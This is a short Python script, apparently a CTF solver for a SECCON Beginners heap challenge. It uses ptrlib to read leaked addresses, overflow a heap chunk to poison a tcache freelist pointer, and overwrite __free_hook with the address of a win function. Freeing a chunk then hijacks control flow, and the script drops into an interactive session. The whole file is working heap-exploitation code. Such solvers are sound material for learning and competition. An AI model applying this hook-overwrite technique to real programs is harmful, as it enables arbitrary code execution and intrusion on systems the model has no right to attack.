from ptrlib import *
import time

def write(data):
    sock.sendlineafter("> ", "1")
    time.sleep(0.1)
    sock.send(data)
def malloc(data):
    sock.sendlineafter("> ", "2")
    time.sleep(0.1)
    sock.send(data)
def free():
    sock.sendlineafter("> ", "3")

sock = Process("../build/chall", cwd="../build")
#sock = Socket("bh.quals.beginners.seccon.jp", 9002)

# leak
sock.recvuntil(": ")
addr_free_hook = int(sock.recvline(), 16)
sock.recvuntil(": ")
addr_win = int(sock.recvline(), 16)
logger.info("__free_hook = " + hex(addr_free_hook))
logger.info("win = " + hex(addr_win))

# overwrite fd
payload = b"A" * 0x18
payload += p64(0x30)
payload += p64(addr_free_hook)
malloc("Hello")
free()
write(payload)

# get __free_hook
malloc("Hello")
free()

# overwrite __free_hook
malloc(p64(addr_win))
free()

sock.interactive()
